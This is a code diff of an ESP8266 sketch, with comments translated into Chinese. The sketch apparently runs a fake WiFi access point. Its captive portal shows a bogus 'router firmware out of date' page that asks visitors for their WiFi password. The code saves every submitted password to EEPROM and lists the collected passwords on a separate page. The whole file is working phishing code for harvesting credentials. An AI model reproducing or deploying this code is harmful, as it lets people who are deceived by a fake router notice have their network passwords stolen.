@@ -7,10 +7,10 @@
 #include <ESP8266WebServer.h>
 #include <EEPROM.h>
 
-// Default SSID name
-const char* SSID_NAME = "测试"; // 默认SSID名称
 
-// Default main strings
+const char* SSID_NAME = "测试"; //默认SSID名称，就是你的WiFi热点名称
+
+//默认的字符串
 #define SUBTITLE "Router info." // 路由器信息
 #define TITLE "Update" // 更新
 #define BODY "Your router firmware is out of date. Update your firmware to continue browsing normally." // 您的路由器固件已过期。请更新固件以继续正常浏览。
@@ -29,25 +29,24 @@ String allPass = "";
 String newSSID = "";
 String currentSSID = "";
 
-// For storing passwords in EEPROM.
-// 用于在EEPROM中存储密码
-int initialCheckLocation = 20; // Location to check whether the ESP is running for the first time. // 检查ESP是否首次运行的位置
-int passStart = 30;            // Starting location in EEPROM to save password. // 密码在EEPROM中的起始位置
-int passEnd = passStart;       // Ending location in EEPROM to save password. // 密码在EEPROM中的结束位置
+
+// 用于在EEPROM中存储密码，这里是未来
+int initialCheckLocation = 20; //检查ESP是否首次运行的位置
+int passStart = 30;            // 密码在EEPROM中的起始位置
+int passEnd = passStart;       //密码在EEPROM中的结束位置，初始化为开始位置
 
 
 unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
 DNSServer dnsServer; ESP8266WebServer webServer(80);
 
+//----------------这些都是以函数形式存在的字符串，用来拼成HTML文本
 String input(String argName) {
   String a = webServer.arg(argName);
   a.replace("<","&lt;");a.replace(">","&gt;");
   a.substring(0,200); return a; }
-
 String footer() { 
   return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
 }
-
 String header(String t) {
   String a = String(currentSSID);
   String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
@@ -66,17 +65,14 @@ String header(String t) {
     "<meta charset=\"UTF-8\"></head>"
     "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
   return h; }
-
 String index() {
   return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>WiFi password:</label>"+
     "<input type=password name=m></input><input type=submit value=Start></form>" + footer();
 }
-
 String posted() {
   String pass = input("m");
   pass = "<li><b>" + pass + "</li></b>"; // Adding password in a ordered list. // 以有序列表形式添加密码
   allPass += pass;                       // Updating the full passwords. // 更新所有密码
-
   // Storing passwords to EEPROM.
   // 将密码存储到EEPROM
   for (int i = 0; i <= pass.length(); ++i)
@@ -90,6 +86,8 @@ String posted() {
   
   return header(POST_TITLE) + POST_BODY + footer();
 }
+//------------------------------------------------------------
+
 
 String pass() {
   return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
